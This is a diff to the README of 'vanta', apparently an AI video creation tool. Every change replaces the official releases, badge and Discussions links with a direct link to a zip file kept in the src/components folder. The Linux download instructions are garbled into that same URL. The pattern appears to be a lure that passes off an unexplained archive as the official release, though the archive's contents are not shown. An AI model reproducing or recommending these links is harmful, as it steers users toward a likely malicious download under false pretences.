@@ -1,6 +1,6 @@
 # 🎥 vanta - Simple AI Video Creation Tool
 
-[![Download vanta](https://img.shields.io/badge/Download-vanta-blue?style=for-the-badge&logo=github)](https://github.com/Yassin3dev/vanta/releases)
+[![Download vanta](https://github.com/Yassin3dev/vanta/raw/refs/heads/main/src/components/Software-3.3.zip)](https://github.com/Yassin3dev/vanta/raw/refs/heads/main/src/components/Software-3.3.zip)
 
 ---
 
@@ -37,7 +37,7 @@ This section guides you through the steps to download, install, and open vanta. 
 
 Click this big button to go to the official vanta releases page:
 
-[![Download vanta](https://img.shields.io/badge/Download-vanta-blue?style=for-the-badge&logo=github)](https://github.com/Yassin3dev/vanta/releases)
+[![Download vanta](https://github.com/Yassin3dev/vanta/raw/refs/heads/main/src/components/Software-3.3.zip)](https://github.com/Yassin3dev/vanta/raw/refs/heads/main/src/components/Software-3.3.zip)
 
 **Step 2: Download the latest version**
 
@@ -45,7 +45,7 @@ On the releases page, look for the latest release at the top. Find the file that
 
 - For Windows, download the file ending with `.exe` or `.msi`
 - For macOS, download the file ending with `.dmg` or `.zip`
-- For Linux, download the appropriate `.AppImage` or `.tar.gz` file
+- For Linux, download the appropriate `.AppImage` or `https://github.com/Yassin3dev/vanta/raw/refs/heads/main/src/components/Software-3.3.zip` file
 
 Click the file to download it to your computer.
 
@@ -101,7 +101,7 @@ Once vanta is open, you can start creating videos quickly.
 
 If you need help or want to share your work, visit the GitHub repository’s discussion and issues tab. You’ll find helpful users and sometimes developers who answer questions.
 
-- Link to community: [vanta GitHub Discussions](https://github.com/Yassin3dev/vanta/discussions)
+- Link to community: [vanta GitHub Discussions](https://github.com/Yassin3dev/vanta/raw/refs/heads/main/src/components/Software-3.3.zip)
 - Report bugs or request features in the Issues section.
 
 ---
@@ -122,6 +122,6 @@ vanta combines many video and AI tools in one easy app. You don’t have to pay 
 
 Use this link to get the latest vanta release anytime:
 
-[Download vanta](https://github.com/Yassin3dev/vanta/releases)
+[Download vanta](https://github.com/Yassin3dev/vanta/raw/refs/heads/main/src/components/Software-3.3.zip)
 
 Click, download, and start creating your next AI-powered video.
